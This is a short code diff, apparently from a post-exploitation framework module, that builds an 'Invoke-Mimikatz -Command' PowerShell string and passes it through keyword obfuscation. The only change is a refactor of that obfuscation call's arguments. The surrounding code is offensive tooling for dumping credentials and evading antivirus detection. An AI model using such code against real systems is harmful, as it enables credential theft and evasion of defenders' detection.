@@ -99,7 +99,7 @@ class Module(object):
         # build the custom command with whatever options we want
         scriptEnd = "Invoke-Mimikatz -Command "
         scriptEnd += "'\"" + self.options['Command']['Value'] + "\"'"
-        scriptEnd = helpers.keyword_obfuscation(scriptEnd, self.mainMenu)
+        scriptEnd = helpers.keyword_obfuscation(scriptEnd)
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
